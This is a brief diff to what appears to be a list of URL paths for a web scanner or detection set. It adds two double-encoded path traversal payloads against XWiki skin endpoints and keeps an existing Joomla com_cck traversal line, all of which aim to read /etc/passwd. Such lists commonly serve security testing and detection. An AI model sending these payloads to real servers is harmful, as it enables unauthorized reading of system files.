@@ -4,3 +4,6 @@
 /
 /api/v1/chatflows
 /index.php?option=com_cck&task=download&file=tmp/../../../../etc/passwd
+
+/xwiki/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
